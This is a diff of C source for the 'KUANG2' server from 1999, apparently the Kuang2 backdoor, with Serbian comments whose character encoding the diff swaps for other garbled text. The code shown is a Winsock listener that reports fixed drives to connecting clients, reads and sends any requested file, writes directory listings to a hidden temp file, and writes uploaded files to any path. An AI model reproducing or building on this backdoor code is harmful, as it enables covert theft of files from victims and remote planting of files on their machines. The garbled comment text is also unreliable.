@@ -1,11 +1,11 @@
 /***[ThuNderSoft]*************************************************************
 								 KUANG2: server
 								   ver: 0.15
-								úùÄÍ WEIRD ÍÄùú
+								     WEIRD
 *****************************************************************************/
 
 /* HISTORY */
-// ver 0.15 (06-may-1999): konaan oblik
+// ver 0.15 (06-may-1999): konaÄan oblik
 // ver 0.10 (30-mar-1999): born code
 
 #include <windows.h>
@@ -26,8 +26,8 @@ SOCKET listen_socket;
 /*
 	StartServer
 	-----------
-  ş Poetak rada servera. Kreira se socket, postavlja se asinhrono
-	obave„tavanje i ukljuuje se listen mod */
+  + PoÄetak rada servera. Kreira se socket, postavlja se asinhrono
+	obaveÅ¡tavanje i ukljuÄuje se listen mod */
 
 int StartServer(void)
 {
@@ -37,14 +37,14 @@ int StartServer(void)
 	// zahteva se winsock v1.1
 	if (WSAStartup (0x101, &W)) return 2;
 
-	// obri„i request listu
+	// obriÅ¡i request listu
 	ClearRequests();
 
 	// kreiraj stream socket
 	listen_socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 	if (listen_socket==INVALID_SOCKET) return 1;
 
-	// postavi asinhrono obave„tavanje
+	// postavi asinhrono obaveÅ¡tavanje
 	if (WSAAsyncSelect(listen_socket, hWnd, UM_ASYNC, FD_ACCEPT) == INVALID_SOCKET) {
 		closesocket(listen_socket);
 		return 2;
@@ -73,7 +73,7 @@ int StartServer(void)
 /*
 	OnAccept
 	--------
-  ş dobijena je asinhrona poruka za prijem konekcije */
+  + dobijena je asinhrona poruka za prijem konekcije */
 
 void OnAccept(SOCKET socket)
 {
@@ -89,7 +89,7 @@ void OnAccept(SOCKET socket)
 
 	// preuzmi novi request
 	nlen=NewRequest();
-	if (nlen==NOMOREREQUEST) {			// ima previ„e konektovanih klijenata
+	if (nlen==NOMOREREQUEST) {			// ima previÅ¡e konektovanih klijenata
 		unsigned int err=K2_ERROR;
 		send(peer_socket, (char *) &err, 4, 0);
 		closesocket(peer_socket);
@@ -109,7 +109,7 @@ void OnAccept(SOCKET socket)
 /*
 	OnQuitclient
 	------------
-  ş dobijena je poruka za zavr„avanje klijenta */
+  + dobijena je poruka za zavrÅ¡avanje klijenta */
 
 void OnQuitclient(SOCKET socket)
 {
@@ -125,7 +125,7 @@ void OnQuitclient(SOCKET socket)
 	// zatvori thread
 	CloseHandle(request[i].thread);
 
-	// obri„i zauzeto polje u Request listi
+	// obriÅ¡i zauzeto polje u Request listi
 	request[i].socket=-1;
 
 	return;
@@ -135,7 +135,7 @@ void OnQuitclient(SOCKET socket)
 /*
 	ServerThread
 	------------
-  ş Svaka konekcija koja se zakai na server koristi ovaj thread. */
+  + Svaka konekcija koja se zakaÄi na server koristi ovaj thread. */
 
 DWORD WINAPI ServerThread (LPVOID targ)
 {
@@ -151,7 +151,7 @@ DWORD WINAPI ServerThread (LPVOID targ)
 	char filelist[MAX_PATH+1];
 
 	fajlsize=0;
-	// ovo je kulturan server - „alje pozdravnu poruku pri konekciji
+	// ovo je kulturan server - Å¡alje pozdravnu poruku pri konekciji
 	k2_msg->command=K2_HELO;					// komanda prepoznavanja
 	k2_msg->param=drives;						// informacije o fixnim diskovima
 	temp=BUFFER_SIZE-8;
@@ -163,10 +163,10 @@ DWORD WINAPI ServerThread (LPVOID targ)
 
 		// primi poruku
 		bytes_recieved=recv(msgsock, buffer, BUFFER_SIZE, 0);	// prihvati poruku od klijenta
-		if (!bytes_recieved) k2_msg->command=K2_QUIT;			// ako je klijent oti„ao
-		if ((bytes_recieved==SOCKET_ERROR)) {					// ako je nastupila gre„ka
+		if (!bytes_recieved) k2_msg->command=K2_QUIT;			// ako je klijent otiÅ¡ao
+		if ((bytes_recieved==SOCKET_ERROR)) {					// ako je nastupila greÅ¡ka
 			if (WSAGetLastError()!=WSAEWOULDBLOCK) k2_msg->command=K2_QUIT; // i to fatalna
-				else continue;									// ne fatalna gre„ka - wsaewouldblock
+				else continue;									// ne fatalna greÅ¡ka - wsaewouldblock
 		}
 
 		// parse commands
@@ -181,14 +181,14 @@ DWORD WINAPI ServerThread (LPVOID targ)
 					send(msgsock, buffer, 4, 0);
 					break;
 				}
-				// faza #2 - zapoinje burst prenos fajla
+				// faza #2 - zapoÄinje burst prenos fajla
 				if (k2_msg->param==2) {
 					while (fajlsize) {
 						tosend=BUFFER_SIZE;
 						if (tosend>fajlsize) tosend=fajlsize;
 						SetFilePointer(fajl, -fajlsize, NULL, FILE_END);
 						ReadFile(fajl, buffer, tosend, &temp, NULL);
-						bytes_sent=send(msgsock, buffer, tosend, 0);	// po„alji 1KB fajla
+						bytes_sent=send(msgsock, buffer, tosend, 0);	// poÅ¡alji 1KB fajla
 						if (bytes_sent==SOCKET_ERROR) {
 							if (WSAGetLastError()!=WSAEWOULDBLOCK) break;
 								else bytes_sent=0;
@@ -201,12 +201,12 @@ DWORD WINAPI ServerThread (LPVOID targ)
 				fajl=CreateFile(k2_msg->bdata, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);
 				fajlsize=GetFileSize(fajl, NULL);
 				if ((fajlsize==0xFFFFFFFF) || (fajl==INVALID_HANDLE_VALUE)) {
-					k2_msg->command=K2_ERROR;		// neka gre„ka pri radu sa fajlom
+					k2_msg->command=K2_ERROR;		// neka greÅ¡ka pri radu sa fajlom
 					send(msgsock, buffer, 4, 0);
 					break;
 				}
 				k2_msg->command=K2_DONE;			// fajl spreman za download
-				k2_msg->param=fajlsize;				// veliina fajla
+				k2_msg->param=fajlsize;				// veliÄina fajla
 				send(msgsock, buffer, 8, 0);
 				break;
 
@@ -251,8 +251,8 @@ DWORD WINAPI ServerThread (LPVOID targ)
 				GetTempFileName(temppath, Kuang2_class, 0, filelist);
 
 				fajl=CreateFile(filelist, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_HIDDEN, NULL);
-				hSearch=FindFirstFile(k2_msg->bdata, &FileData);	// tra‚i...
-				if ((fajl==INVALID_HANDLE_VALUE) || (hSearch==INVALID_HANDLE_VALUE)) {	// ako ne na”e prvi fajl ili fajl nije otvoren
+				hSearch=FindFirstFile(k2_msg->bdata, &FileData);	// traÅ¾i...
+				if ((fajl==INVALID_HANDLE_VALUE) || (hSearch==INVALID_HANDLE_VALUE)) {	// ako ne naÄ‘e prvi fajl ili fajl nije otvoren
 					k2_msg->command=K2_ERROR;
 					CloseHandle(fajl); DeleteFile(filelist);
 					send(msgsock, buffer, 4, 0);
@@ -264,21 +264,21 @@ DWORD WINAPI ServerThread (LPVOID targ)
 					if (FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
 						wsprintf(buffer, "*%s", FileData.cFileName);
 					else {
-						temp=FileData.nFileSizeLow >> 10;		// veliina fajla u KB
+						temp=FileData.nFileSizeLow >> 10;		// veliÄina fajla u KB
 						if (FileData.nFileSizeLow) temp++;		// da 0 fajl bude zaista 0
 						if (FileData.nFileSizeHigh) temp=-1;	// ako je fajl jako veliki
 						wsprintf(buffer, "%s <%1luk>", FileData.cFileName, temp);
 					}
 
-					// upi„i string u fajl, zajedno sa NULL terminatorom na kraju
+					// upiÅ¡i string u fajl, zajedno sa NULL terminatorom na kraju
 					WriteFile(fajl, buffer, strlengthF(buffer)+1, &temp, NULL);
 
-					// uzima slede†i fajl
+					// uzima sledeÄ‡i fajl
 					if (!FindNextFile(hSearch, &FileData)) {
-						if (GetLastError()==ERROR_NO_MORE_FILES) {	// do„li smo na kraj - nema vi„e fajlova
-							k2_msg->command=K2_DONE;				// po„alji oznaku za kraj
+						if (GetLastError()==ERROR_NO_MORE_FILES) {	// doÅ¡li smo na kraj - nema viÅ¡e fajlova
+							k2_msg->command=K2_DONE;				// poÅ¡alji oznaku za kraj
 							strcopyF(k2_msg->bdata, filelist);		// i ime fajla za download
-						} else k2_msg->command=K2_ERROR;			// nastupila je gre„ka
+						} else k2_msg->command=K2_ERROR;			// nastupila je greÅ¡ka
 
 						FindClose(hSearch);		// zatvori pretragu
 						CloseHandle(fajl);		// zatvori fajl
@@ -296,7 +296,7 @@ DWORD WINAPI ServerThread (LPVOID targ)
 				fajlsize=k2_msg->param;
 				fajl=CreateFile(k2_msg->sdata, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL);
 				if (fajl==INVALID_HANDLE_VALUE) {
-					k2_msg->command=K2_ERROR;		// nastupila je gre„ka
+					k2_msg->command=K2_ERROR;		// nastupila je greÅ¡ka
 					send(msgsock, buffer, 4, 0);
 					break;
 				}
